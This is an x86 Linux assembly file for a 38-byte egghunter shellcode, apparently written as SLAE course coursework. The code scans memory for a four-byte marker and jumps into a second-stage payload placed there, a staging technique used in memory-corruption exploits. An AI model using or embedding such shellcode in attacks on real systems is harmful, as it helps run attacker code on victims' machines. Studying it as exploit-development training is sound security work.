;
; Linux x86
; Author:  thryb
; Date:    02-08-16
; Purpose: Egghunter shellcode
; Size:    38 bytes
; ID:      SLAE-770
; Git:     https://www.github.com/thryb/SLAE-770
; 

global _start
section .text

_start:

xor ebp, ebp ; cleaning ebp for execution sanity

jmp short get_addr ; jmp call pop for current address

pop_addr:
	pop eax ; put current addr in eax
	mov ecx, 0x91919191 ; xchg eax, ecx * 4  

find_egg: 
	inc eax ; inc to next addr
	cmp DWORD [eax], ecx ; compare the value @ eax with 0x91919191
	jne find_egg ; jmp is no equal

	jmp eax ; jmp to our shellcode

get_addr:
	call pop_addr ; put next addr on the stack
